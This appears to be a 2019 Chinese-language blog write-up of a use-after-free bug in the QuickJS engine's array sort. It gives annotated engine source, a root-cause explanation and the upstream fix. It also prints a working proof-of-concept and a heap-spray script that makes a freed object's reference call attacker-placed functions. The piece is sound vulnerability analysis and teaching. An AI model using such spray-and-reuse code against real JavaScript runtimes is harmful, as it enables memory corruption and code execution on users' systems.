---
title: "Quickjs UAF漏洞分析，利用以及修复"
date: 2019-08-01T21:47:00+11:00
summary: Quickjs是一个轻量的js引擎，先放张benchmark。可以看到作为一个轻量的js引擎，Quickjs是十分优秀的。在评分上甚至和Hermes这种重型js引擎并驾齐驱。虽然和v8相比还是有不小差距，但是毕竟是一个人开发的，而且相比v8，Quickjs才620kb。
draft: false
---

## 0x01 介绍

[Quickjs](https://bellard.org/quickjs/)是一个轻量的js引擎，先放张benchmark。可以看到作为一个轻量的js引擎，Quickjs是十分优秀的。在评分上甚至和Hermes这种重型js引擎并驾齐驱。虽然和v8相比还是有不小差距，但是毕竟是一个人开发的，而且相比v8，Quickjs才620kb。

![](https://i.imgur.com/xBWtj3e.png) 

具体特性这里就不讲了，有兴趣的可以去Quickjs的作者网站 https://bellard.org/quickjs/， 了解Quickjs的更多特性的同时， 也顺便膜拜一下大神。

之所以写这篇文章还是因为偶像的一个微博。

![](https://i.imgur.com/1MBnEvT.png)

接下来通过对POC和Quickjs的源码进行分析，看看这个漏洞到底是如何产生的，以及如何利用和修复。

## 0x02 POC

```js=
let spray = new Array(100);
let a = [{hack:0},1,2,3,4]; // 在heap上分配内存给{hack:0}, a[0]指向相对应的对象在堆中的地址
let refcopy = [a[0]]; // refcopy指向{hack:0}
// 抛出异常
a.__defineSetter__(3,()=>{throw 1;}); 
// 下面的排序会触发异常抛出，具体如何触发下文会有介绍
try {
	a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
}
catch (e){}
a[0] = 0; // 对象{hack：0}的引用减少1,小于等于0,导致内存被收回
for (let i=0; i<100; i++) spray[i] = [13371337]; // 覆盖被释放的内存
console.log(refcopy[0]); // 13371337
```
通过代码可以看出，这是一个典型的uaf（use after free）攻击。 通过array sorting的漏洞，导致引用没有正确释放，从而使攻击者可以使用这个引用访问已经被释放的内存。接下来通过对Quickjs的源码分析，看看到底是什么原因导致这个漏洞。

## 0x03 源码分析

在Quickjs的源码里，我认为有三个函数对于理解这个漏洞是非常重要的，他们分别是js_array_sort， JS_TryGetPropertyInt64， JS_FreeValue。其中后面两个函数将会被js_array_sort调用。 下面将对这三个函数进行具体分析。


首先是最重要的js_array_sort，漏洞就是出现在这个函数里面。
```c=
static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
                             int argc, JSValueConst *argv)
{
    ...

    /* XXX: should special case fast arrays */
    for (i = 0; i < len; i++) {
        if (pos >= array_size) {
            size_t new_size, slack;
            ValueSlot *new_array;
            new_size = (array_size + (array_size >> 1) + 31) & ~15;
            // 分配新的内存空间给一个临时队列，用于排序
            new_array = js_realloc2(ctx, array, new_size * sizeof(*array),
            &slack);
            if (new_array == NULL)
                goto exception;
            new_size += slack / sizeof(*new_array);
            array = new_array;
            array_size = new_size;
        }
        // 尝试获取对象的属性，并赋值给新生成的array
        // 此函数会增加{hack:0}的引用计数， 下文有专门介绍
        present = JS_TryGetPropertyInt64(ctx, obj, i, &array[pos].val);
   
        if (present < 0)
            goto exception;
        if (present == 0)
            continue;
        if (JS_IsUndefined(array[pos].val)) {
            undefined_count++;
            continue;
        }
        array[pos].str = NULL;
        array[pos].pos = i;
        pos++;
    }

    // 对array进行排序，当队列的元素少于等于特定值（6个）使用插入排序
    rqsort(array, pos, sizeof(*array), js_array_cmp_generic, &asc);

    if (asc.exception)
        goto exception;

    /* XXX: should special case fast arrays */
    while (n < pos) {
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
        if (array[n].pos == n) {
            // 如果顺序没有发生改变，释放array里面对应的元素
            JS_FreeValue(ctx, array[n].val);
        } else {
            // 如果顺序发生改变，将array里的值写回对象对应的属性，这里触发异常抛出
            // 直接进入异常处理部分
            // a.__defineSetter__(3,()=>{throw 1;});
            if (JS_SetPropertyInt64(ctx, obj, n, array[n].val) < 0) { 
                n++;
                goto exception; 
            }
        }
        n++;
    }

    js_free(ctx, array);
    for (i = n; undefined_count-- > 0; i++) {
        if (JS_SetPropertyInt64(ctx, obj, i, JS_UNDEFINED) < 0)
            goto fail;
    }
    for (; i < len; i++) {
        if (JS_DeletePropertyInt64(ctx, obj, i, JS_PROP_THROW) < 0)
            goto fail;
    }
    return obj;

exception:
    for (n = 0; n < pos; n++) {
        // 释放array里面对应的元素内存，导致对象reference减少1
        // 这里出现重复释放（在进入异常处理前，一部分array中的元素已经释放）
        // 下文有专门介绍
        JS_FreeValue(ctx, array[n].val); 
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
    }
    js_free(ctx, array);
fail:
    JS_FreeValue(ctx, obj);
    return JS_EXCEPTION;
}


```

接下来是JS_TryGetPropertyInt64， 这个函数会增加{hack:0}对象的引用计数。
```c=
static int JS_TryGetPropertyInt64(JSContext *ctx, JSValueConst obj, int64_t idx, JSValue *pval)
{
    JSValue val = JS_UNDEFINED;
    JSAtom prop;
    int present;

    // #define JS_ATOM_TAG_INT (1U << 31)
    // #define JS_ATOM_MAX_INT (JS_ATOM_TAG_INT - 1)
    // #define likely(x)  __builtin_expect(!!(x), 1) 分支预测
    if (likely((uint64_t)idx <= JS_ATOM_MAX_INT)) {
        /* fast path */
        // 全部都进入这个分支
        present = JS_HasProperty(ctx, obj, __JS_AtomFromUInt32(idx));
        if (present > 0) {
            // JS_NewInt32里面调用JS_DupValue，将会增加对象{hack:0}的引用计数
            val = JS_GetPropertyValue(ctx, obj, JS_NewInt32(ctx, idx));
            // #define unlikely(x)  __builtin_expect(!!(x), 0)
            if (unlikely(JS_IsException(val)))
                present = -1;
        }
    } else {
        prop = JS_NewAtomInt64(ctx, idx);
        present = -1;
        
        if (likely(prop != JS_ATOM_NULL)) {
            present = JS_HasProperty(ctx, obj, prop);
            if (present > 0) {
                val = JS_GetProperty(ctx, obj, prop);
                if (unlikely(JS_IsException(val)))
                    present = -1;
            }
            JS_FreeAtom(ctx, prop);
        }
    }
    *pval = val;
    return present;
}
```

最后是JS_FreeValue。 顾名思义是一个减少引用计数，释放内存的函数。
```c=
static inline void JS_FreeValue(JSContext *ctx, JSValue v)
{
    if (JS_VALUE_HAS_REF_COUNT(v)) {
        JSRefCountHeader *p = JS_VALUE_GET_PTR(v); 
        // Quickjs使用引用计数的方式做垃圾回收
        // 当引用减少到小于等于0时，释放相应内存
        if (--p->ref_count <= 0) { 
            __JS_FreeValue(ctx, v);
        }
    }
}
```

## 0x04 原理和触发条件

Quickjs在进行sorting的时候主要有三个阶段。

- 第一阶段是生成一个新的array，将要排序的array object(a = [{hack:0},1,2,3,4])通过getproperty的方式(主要函数是JS_TryGetPropertyInt64)，把value写入array。
- 第二个阶段是对这个array进行排序（rqsort）。
- 第三个阶段是将这个array里面的值通过setproporty的方法重新写回object。而出现错误的地方就是在第三个阶段。 当排序的过后，如果array里面的元素顺序没有发生变化，相应的元素内存会被马上释放（准确来说是减少引用次数）。但是如果之后回写剩余元素的时候出现异常，会进入异常处理的部分。这里整个array里的所有元素又会被重新释放一次，而这里面就包括了之前因为顺序没有变化而已经释放的元素，导致引用计数被多减少一次。

搞清楚原理之后，我们就知道要触发这个漏洞的条件是

1. 对有对象引用的队列进行排序
2. 排序时抛出异常
3. 对队列中的对象进行引用，这样内存错误释放后，仍然可以访问相应内存

## 0x05 利用
一般对这种uaf的利用都是用函数地址去覆盖被错误释放的内存，从而实现执行任意代码。这里面涉及到了堆栈的内存分配和释放，有兴趣的可以看看[Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf)，里面有详细的关于堆栈漏洞的利用原理的介绍。

利用代码如下

```js=
let spray = new Array(100);
let a = [{hack:0},1,2,3,4]; 
let refcopy = [a[0]]; 

a.__defineSetter__(3,()=>{throw 1;}); 
try {
	a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
}
catch (e){}
a[0] = 0; 

// 用函数地址覆盖错误释放的内存
for (let i=0; i<100; i++) spray[i] = () => {console.log("hack")}; 
console.log(refcopy[0]()); // "hack"
```

## 0x06 修复

之前原理部分已经提到，出错的原因在于排序出错的时候，array的所有元素都会被引用计数减1，造成重复释放。所以只要去掉重复释放的地方就可以。一种修改方法是当顺序不变的时候先不释放，等全部元素都写回object之后在把array中所有元素集中一起释放。还有一种修改方法是在出错的时候不要重复释放之前已经释放的元素，具体修改如下：

```c=
...
exception:
    // for (n = 0; n < pos; n++) { // 释放整个array的所有元素
    for (; n < pos; n++) { // 从出错的地方之后开始释放
        // 释放array里面对应的元素内存，导致对象reference减少1
        JS_FreeValue(ctx, array[n].val); 
        if (array[n].str)
            JS_FreeValue(ctx, JS_MKPTR(JS_TAG_STRING, array[n].str));
    }
```

在7月21号的新release中，这个uaf的漏洞已经被修复。通过diff我们可以发现作者选择了第二种更简单高效的修复方式。

## 0x07 道高一尺，魔高一丈

![](https://i.imgur.com/JI8wvC1.png)

在新Release发出来没几天，又有人发现新的uaf漏洞。推特发出没多久，漏洞发现者就说，这个漏洞已经被Quickjs的作者修复了。不愧是大神。期待Quickjs的下一个release！

## Reference

1. [Modern Binary Exploitation CSCI 4968](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf)
2. https://bellard.org/quickjs/
